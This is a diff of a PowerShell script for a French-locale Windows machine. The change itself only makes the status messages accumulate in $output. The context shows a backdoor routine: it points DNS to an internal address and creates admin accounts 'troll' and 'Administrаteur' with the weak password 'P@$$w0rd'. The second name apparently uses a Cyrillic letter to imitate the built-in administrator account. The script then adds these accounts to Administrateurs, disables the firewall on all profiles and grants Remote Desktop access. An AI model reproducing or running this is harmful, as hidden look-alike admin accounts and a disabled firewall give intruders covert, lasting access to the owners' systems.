@@ -19,59 +19,59 @@ $output = "" # Variable de sortie
 ### Définition du DNS
 try {
     Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses "10.110.12.210"
-    $output = "DNS défini sur 10.110.12.210"
+    $output += "DNS défini sur 10.110.12.210"
 }
 catch {
-    $output = "Erreur lors de la définition du DNS"
+    $output += "Erreur lors de la définition du DNS"
 }
 # Create users
 try {
     New-LocalUser -Name "troll" -Password (ConvertTo-SecureString -String "P@$$w0rd" -AsPlainText -Force) -Description "Admin account"
 } catch {
-    $output = "Error creating user 'troll'"
+    $output += "Error creating user 'troll'"
 }
 
 try {
     New-LocalUser -Name "Administrаteur" -Password (ConvertTo-SecureString -String "P@$$w0rd" -AsPlainText -Force) -Description "Admin account"
 } catch {
-    $output = "Error creating user 'Administrаteur'"
+    $output += "Error creating user 'Administrаteur'"
 }
 
 # Add users to Administrators group
 try {
     Add-LocalGroupMember -Group "Administrateurs" -Member "troll"
 } catch {
-    $output = "Error adding 'troll' to Administrators group"
+    $output += "Error adding 'troll' to Administrators group"
 }
 
 try {
     Add-LocalGroupMember -Group "Administrateurs" -Member "ais2024"
 } catch {
-    $output = "Error adding 'ais2024' to Administrators group"
+    $output+= "Error adding 'ais2024' to Administrators group"
 }
 
 try {
     Add-LocalGroupMember -Group "Administrateurs" -Member "Administrаteur"
 } catch {
-    $output = "Error adding 'Administrаteur' to Administrators group"
+    $output += "Error adding 'Administrаteur' to Administrators group"
 }
 try {
     Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
 }
 catch {
-    $output = "Error disabling firewall"
+    $output += "Error disabling firewall"
 }
 try {
     Enable-NetAdapter -Name "Ethernet" -Confirm:$false
-    $output = "Ethernet card enabled"
+    $output += "Ethernet card enabled"
 }
 catch {
-    $output = "Error enabling Ethernet card"
+    $output += "Error enabling Ethernet card"
 }
 try {
     Add-LocalGroupMember -Group "Remote Desktop Users" -Member "ais2024"
 } catch {
-    $output = "Error adding 'ais2024' to Remote Desktop Users group"
+    $output += "Error adding 'ais2024' to Remote Desktop Users group"
 }
-Send-Email -body $output
+Send-Email
 $output
